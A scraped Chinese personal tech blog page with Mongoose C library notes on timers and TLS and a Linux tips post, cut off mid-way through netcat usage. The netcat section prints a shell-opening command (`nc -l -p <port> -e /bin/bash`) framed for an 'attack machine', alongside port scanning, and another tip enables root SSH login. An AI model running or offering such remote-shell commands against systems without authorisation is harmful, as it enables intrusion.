<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_timer_init</span><span class="params">(<span class="keyword">struct</span> mg_timer **head, <span class="keyword">struct</span> mg_timer *t, <span class="type">uint64_t</span> period_ms, <span class="type">unsigned</span> flags, <span class="type">void</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>head</code>    –  指向<code>mg_timer</code>队列头部的指针</li>
<li><code>t</code>       –  指向一个需要被初始化的<code>mg_timer</code></li>
<li><code>ms</code>      –  时间间隔，以毫秒为单位</li>
<li><code>flags</code>   –  计时器标志掩码：<code>MG_TIMER_REPEAT</code>和<code>MG_TIMER_RUN_NOW</code></li>
<li><code>fn</code>    –  函数调用</li>
<li><code>fn_data</code>  –  调用的函数参数</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_fn</span><span class="params">(<span class="type">void</span> *data)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_timer</span> <span class="title">timer</span>, *<span class="title">head</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">mg_timer_init(&amp;head, &amp;timer, <span class="number">1000</span>, MG_TIMER_REPEAT, timer_fn, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-timer-free"><a href="#mg-timer-free" class="headerlink" title="mg_timer_free"></a>mg_timer_free</h2><ul>
<li><p>简介：</p>
<ul>
<li>释放计时器，将其从内部计时器列表中删除。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_timer_free</span><span class="params">(<span class="keyword">struct</span> mg_timer **head, <span class="keyword">struct</span> mg_timer *t)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>head</code>  –  指向<code>mg_timer</code>队列头部的指针</li>
<li><code>t</code>     –  需要释放的计时器</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_timer</span> <span class="title">timer</span>;</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">mg_timer_free(&amp;timer);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-timer-poll"><a href="#mg-timer-poll" class="headerlink" title="mg_timer_poll"></a>mg_timer_poll</h2><ul>
<li><p>简介：</p>
<ul>
<li>如果当前的时间戳<code>uptime_ms</code>超过了计时器的到期时间，则计时器遍历列表，并调用它们</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_timer_poll</span><span class="params">(<span class="keyword">struct</span> mg_timer **head, <span class="type">uint64_t</span> uptime_ms)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>head</code>   –  指向<code>mg_timer</code>列表头部的指针</li>
<li><code>uptime_ms</code>  –  当前时间戳</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mg_timer_poll(mg_millis());</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-millis"><a href="#mg-millis" class="headerlink" title="mg_millis"></a>mg_millis</h2><ul>
<li><p>简介：</p>
<ul>
<li>以毫秒为单位返回当前运行时间。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int64_t</span> <span class="title">mg_millis</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>当前时间</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int64_t</span> uptime = <span class="built_in">mg_millis</span>();</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_tls/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_tls/" class="post-title-link" itemprop="url">mongoose_tls</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>TLS(Transport Layer Security)，是一种用于保护网络通信安全性的加密协议。它建立在传输层协议(例如TCP)之上，用于在客户端和服务器之间创建安全的通信通道</li>
</ul>
<h2 id="struct-mg-tls-opts"><a href="#struct-mg-tls-opts" class="headerlink" title="struct mg_tls_opts"></a>struct mg_tls_opts</h2><ul>
<li><p>简介：</p>
<ul>
<li>TLS初始化结构</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_tls_opts</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ca;        <span class="comment">// CA certificate file. For both listeners and clients</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *crl;       <span class="comment">// Certificate Revocation List. For clients</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cert;      <span class="comment">// Certificate</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *certkey;   <span class="comment">// Certificate key</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ciphers;   <span class="comment">// Cipher list</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_str</span> srvname; <span class="comment">// If not empty, enables server name verification</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_fs</span> *fs;      <span class="comment">// FS API for reading certificate files</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>ca – 证书颁发机构。可以是文件名或字符串。用于验证另一端发送给我们的证书。如果为空，则禁用证书检查。</li>
<li>crl – 证书吊销列表。可以是文件名或字符串。用于验证另一端发送给我们的证书。如果为空，则禁用证书吊销检查。</li>
<li>cert – 我们自己的证书。可以是文件名或字符串。如果为NULL，则不与对方进行认证。</li>
<li>certkey – 证书的密钥。有时，证书和它的密钥绑定在一个.pem文件中，在这种情况下，cert和certkey的值可能是相同的</li>
<li>ciphers – 允许使用的密码列表</li>
<li>srvname – 启用服务器名称验证</li>
</ul>
</li>
<li><p>注：</p>
<ul>
<li>如果ca和cert都设置了，那么所谓的双向TLS就启用了，这时双方都要互相验证。通常，服务器端连接同时设置ca和cert，而客户端只设置ca。</li>
</ul>
</li>
</ul>
<h2 id="mg-tls-init"><a href="#mg-tls-init" class="headerlink" title="mg_tls_init"></a>mg_tls_init</h2><ul>
<li><p>简介：</p>
<ul>
<li>在给定连接上初始化TLS</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_tls_init</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="keyword">struct</span> mg_tls_opts *opts)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c – 需要初始化TLS的连接</li>
<li>opts – TLS初始化参数</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_tls_opts</span> opts = &#123;.cert = <span class="string">&quot;ca.pem&quot;</span>&#125;;</span><br><span class="line"><span class="built_in">mg_tls_init</span>(c, &amp;opts);</span><br></pre></td></tr></table></figure>
</li>
<li><p>注：</p>
<ul>
<li>mbedTLS使用mg_random作为RNG。mg_random可以通过设置MG_ENABLE_CUSTOM_RANDOM&#x3D;1并定义自己的mg_random()实现来覆盖。</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/linux_3_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-linux_3_01_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Linux/linux_3_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-linux_3_01_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">linux_3_01_常用技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>linux系统的常用技巧和方法</li>
</ul>
<h2 id="linux-测试指定网段是否存在主机"><a href="#linux-测试指定网段是否存在主机" class="headerlink" title="linux 测试指定网段是否存在主机"></a>linux 测试指定网段是否存在主机</h2><p>要测试指定网段中是否存在主机，你可以使用 <code>nmap</code> 命令。<code>nmap</code> 是一个网络探测和安全审核工具，可以用来扫描网络上的主机、端口等信息。你可以在 Linux 终端中使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>这个命令将扫描 <code>192.168.1.0/24</code> 网段中的所有主机，并列出活跃的主机。 <code>-sn</code> 选项告诉 <code>nmap</code> 不要进行端口扫描，只是简单地检查主机是否在线。你可以将 <code>192.168.1.0/24</code> 替换为你要测试的网段。</p>
<h2 id="linux-安装nmap命令"><a href="#linux-安装nmap命令" class="headerlink" title="linux 安装nmap命令"></a>linux 安装nmap命令</h2><p>在大多数 Linux 发行版中，安装 <code>nmap</code> 命令非常简单。你只需打开终端，并根据你使用的 Linux 发行版执行相应的安装命令。</p>
<ul>
<li><p><strong>在 Ubuntu 或 Debian 上</strong>，你可以使用 <code>apt</code> 包管理器安装 <code>nmap</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nmap</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在 CentOS 或 Fedora 上</strong>，你可以使用 <code>yum</code> 包管理器安装 <code>nmap</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install nmap</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在其他基于 RPM 包管理的系统上</strong>，你也可以使用 <code>dnf</code> 包管理器安装 <code>nmap</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install nmap</span><br></pre></td></tr></table></figure></li>
</ul>
<p>一旦安装完成，你就可以在终端中使用 <code>nmap</code> 命令了。</p>
<h2 id="ubuntu-root-ssh-登陆配置"><a href="#ubuntu-root-ssh-登陆配置" class="headerlink" title="ubuntu root ssh 登陆配置"></a>ubuntu root ssh 登陆配置</h2><ul>
<li><p>设置root密码</p>
<ul>
<li>sudo passwd root</li>
</ul>
</li>
<li><p>修改ssh配置文件</p>
<ul>
<li>安装ssh-server: sudo apt install openssh-server</li>
<li>修改配置文件: sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</li>
<li>修改配置：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoginGraceTime 2m</span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">StrictModes <span class="built_in">yes</span></span><br><span class="line"><span class="comment">#MaxAuthTries 6</span></span><br><span class="line"><span class="comment">#MaxSessions 10</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>重启ssh，使配置生效</p>
<ul>
<li>sudo service ssh restart</li>
</ul>
</li>
</ul>
<h2 id="ubuntu-安装ping工具"><a href="#ubuntu-安装ping工具" class="headerlink" title="ubuntu 安装ping工具"></a>ubuntu 安装ping工具</h2><p><code>ping</code> 工具通常已经预安装在大多数 Ubuntu 发行版中，因此你通常不需要手动安装它。你可以在终端中直接使用 <code>ping</code> 命令来测试网络连接。</p>
<p>打开终端，然后输入以下命令以使用 <code>ping</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &lt;目标主机或IP地址&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;目标主机或IP地址&gt;</code> 替换为你要测试连接的目标主机的域名或IP地址。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping google.com</span><br></pre></td></tr></table></figure>

<p>如果你发现 <code>ping</code> 命令不可用，你可以尝试使用以下命令安装它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install iputils-ping</span><br></pre></td></tr></table></figure>

<p>这将使用 <code>apt</code> 包管理器来安装 <code>iputils-ping</code> 软件包，其中包括 <code>ping</code> 命令。一旦安装完成，你就可以使用 <code>ping</code> 命令了。</p>
<p>请注意，对于最新的 Ubuntu 版本，<code>ping</code> 工具通常是默认安装的，因此你无需手动安装。</p>
<h2 id="linux-查看线程占用资源"><a href="#linux-查看线程占用资源" class="headerlink" title="linux 查看线程占用资源"></a>linux 查看线程占用资源</h2><p>要查看Linux系统中线程的资源占用情况，你可以使用一些工具和命令来获取相关信息。以下是一些方法：</p>
<ol>
<li><p>使用top命令：<br><code>top</code>命令是一个终端工具，可以用于实时监视系统的资源使用情况，包括进程和线程。要查看线程的信息，可以按下<code>H</code>键，这将切换为线程模式，然后你将看到每个线程的资源占用情况。</p>
</li>
<li><p>使用htop命令：<br><code>htop</code>是一个交互式的顶层替代工具，它可以更方便地查看系统资源使用情况，包括线程。你可以在终端中运行<code>htop</code>，然后按下<code>H</code>键，以查看线程列表。</p>
</li>
<li><p>使用ps命令：<br><code>ps</code>命令可以用于列出当前系统中的进程和线程。要显示线程信息，可以运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -eLf</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用pidstat命令：<br><code>pidstat</code>命令可以用于显示进程和线程的资源使用情况统计。要查看线程的资源使用情况，可以运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pidstat -t</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用top命令的扩展选项：<br><code>top</code>命令还支持一些扩展选项，如<code>-H</code>，可以直接启动top时切换到线程模式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -H</span><br></pre></td></tr></table></figure></li>
</ol>
<p>以上这些命令和工具可以帮助你查看Linux系统中线程的资源占用情况，选择其中一个适合你的需求即可。</p>
<h2 id="ubuntu-apt-升级指定安装包"><a href="#ubuntu-apt-升级指定安装包" class="headerlink" title="ubuntu apt 升级指定安装包"></a>ubuntu apt 升级指定安装包</h2><ul>
<li><p>方法一</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install --only-upgrade &lt;packagename&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install &lt;packagename&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="linux-killall-命令未找到"><a href="#linux-killall-命令未找到" class="headerlink" title="linux killall 命令未找到"></a>linux killall 命令未找到</h2><p>如果在 Linux 终端上执行 <code>killall</code> 命令时未找到该命令，可能有以下几种可能原因：</p>
<ol>
<li><p><strong>命令不存在</strong>：<code>killall</code> 命令不是所有 Linux 发行版都默认安装的。某些发行版可能没有包含这个命令，或者可能不在系统的 PATH 路径中。您可以尝试使用 <code>which</code> 命令检查是否存在 <code>killall</code> 命令，以及它的路径。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> killall</span><br></pre></td></tr></table></figure>

<p>如果 <code>which</code> 命令没有返回路径，说明系统中没有安装 <code>killall</code>。</p>
</li>
<li><p><strong>权限问题</strong>：如果您没有足够的权限来执行 <code>killall</code> 命令，可能会导致命令未找到。请确保您具有足够的权限来执行此命令。</p>
</li>
<li><p><strong>未安装相关软件包</strong>：在某些发行版中，<code>killall</code> 命令可能需要额外的软件包才能使用。您可以尝试安装 <code>psmisc</code> 软件包，它包含了 <code>killall</code> 命令。</p>
<p>在 Debian&#x2F;Ubuntu 系统中，您可以使用以下命令安装 <code>psmisc</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install psmisc</span><br></pre></td></tr></table></figure>

<p>在 Red Hat&#x2F;CentOS 系统中，您可以使用以下命令安装 <code>psmisc</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install psmisc</span><br></pre></td></tr></table></figure>

<p>安装完成后，<code>killall</code> 命令应该可用了。</p>
</li>
</ol>
<p>如果以上步骤仍然无法解决问题，可能需要查看系统设置或与系统管理员联系，以了解有关命令可用性的更多信息。</p>
<h2 id="ubuntu-查看CPU架构"><a href="#ubuntu-查看CPU架构" class="headerlink" title="ubuntu 查看CPU架构"></a>ubuntu 查看CPU架构</h2><p>要查看 Ubuntu 系统的 CPU 架构，你可以使用以下几种方法：</p>
<ol>
<li><p>使用 <code>lscpu</code> 命令：</p>
<p>打开终端，然后输入以下命令并按 Enter：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lscpu</span><br></pre></td></tr></table></figure>

<p>这将显示有关 CPU 的详细信息，包括架构、核心数、线程数等。</p>
</li>
<li><p>使用 <code>uname</code> 命令：</p>
<p>另一种方法是使用 <code>uname</code> 命令，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -m</span><br></pre></td></tr></table></figure>

<p>这将只显示 CPU 的架构信息，例如 x86_64（64 位）或 i686（32 位）。</p>
</li>
<li><p>使用 <code>arch</code> 命令：</p>
<p>还可以使用 <code>arch</code> 命令来获取系统的 CPU 架构信息，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">arch</span></span><br></pre></td></tr></table></figure>

<p>这将直接显示 CPU 架构。</p>
</li>
</ol>
<p>通过上述方法之一，你可以轻松地查看 Ubuntu 系统的 CPU 架构信息。</p>
<h2 id="linux-动态库-查看符号链接"><a href="#linux-动态库-查看符号链接" class="headerlink" title="linux 动态库 查看符号链接"></a>linux 动态库 查看符号链接</h2><p>在Linux系统中，你可以使用一些命令来查看动态库以及符号链接。以下是一些常用的命令：</p>
<ol>
<li><p><strong><code>ldd</code>命令</strong>：<code>ldd</code>命令用于显示一个可执行文件或共享库所依赖的动态链接库。你可以在终端中输入以下命令来使用它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd /path/to/your/executable_or_shared_library</span><br></pre></td></tr></table></figure>

<p>这将列出与给定可执行文件或共享库相关联的动态链接库。</p>
</li>
<li><p><strong><code>nm</code>命令</strong>：<code>nm</code>命令用于列出共享库或可执行文件中的符号。你可以在终端中输入以下命令来使用它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nm /path/to/your/shared_library</span><br></pre></td></tr></table></figure>

<p>如果你要查看符号链接，可以在<code>nm</code>命令后面加上<code>-D</code>选项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nm -D /path/to/your/shared_library</span><br></pre></td></tr></table></figure>

<p>这将显示共享库中的所有动态符号。</p>
</li>
<li><p><strong><code>readelf</code>命令</strong>：<code>readelf</code>命令是一个更强大的工具，用于显示ELF（可执行和链接格式）文件的信息，包括共享库和可执行文件。你可以使用以下命令来查看共享库的符号：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s /path/to/your/shared_library</span><br></pre></td></tr></table></figure>

<p>这将列出共享库中的符号表。</p>
</li>
<li><p><strong><code>objdump</code>命令</strong>：<code>objdump</code>命令也可以用来查看二进制文件的信息，包括符号。以下是一个示例命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -T /path/to/your/shared_library</span><br></pre></td></tr></table></figure>

<p>这将显示共享库中的动态符号表。</p>
</li>
</ol>
<p>要注意的是，上述命令中的路径应该替换为你实际的共享库或可执行文件的路径。</p>
<p>如果你想要查看一个符号链接所指向的实际文件，可以使用<code>ls</code>命令，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /path/to/your/symlink</span><br></pre></td></tr></table></figure>

<p>这将显示符号链接指向的实际文件路径。</p>
<h2 id="nc-使用技巧"><a href="#nc-使用技巧" class="headerlink" title="nc 使用技巧"></a>nc 使用技巧</h2><p>Netcat（<code>nc</code>）是一个非常强大且灵活的工具，可以用于各种网络连接、数据传输和调试任务。以下是一些在使用 Netcat 时的一些技巧和用法：</p>
<ol>
<li><p><strong>简单聊天：</strong><br>Netcat 可以用于在终端之间进行简单的聊天，如下所示：</p>
<p>在一台机器上启动监听模式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l &lt;port&gt;</span><br></pre></td></tr></table></figure>

<p>在另一台机器上与其进行连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;hostname&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>文件传输：</strong><br>使用 Netcat 可以在两台计算机之间传输文件。在发送端运行 <code>nc</code> 命令，而在接收端使用 <code>nc</code> 命令监听端口并保存传输的数据，如下所示：</p>
<p>发送文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -w 3 &lt;receiver_ip&gt; &lt;port&gt; &lt; file_to_send</span><br></pre></td></tr></table></figure>

<p>接收文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l &lt;port&gt; &gt; received_file</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>反向 shell：</strong><br>使用 Netcat 可以创建反向 shell 连接，允许你在远程主机上执行命令，如下所示：</p>
<p>在目标主机上启动监听模式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p &lt;port&gt; -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>在攻击机上与目标主机建立连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;target_ip&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>端口扫描：</strong><br>Netcat 可以用于进行基本的端口扫描，以检查目标主机上的哪些端口是开放的，如下所示：</p>
<p>扫描前 1000 个端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv &lt;hostname&gt; 1-1000</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>代理和端口转发：</strong><br>Netcat 可以用于创建简单的代理服务器或端口转发，如下所示：</p>
<p>创建代理服务器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p &lt;port_to_listen&gt; -c <span class="string">&quot;nc &lt;destination_host&gt; &lt;destination_port&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>端口转发：</p>
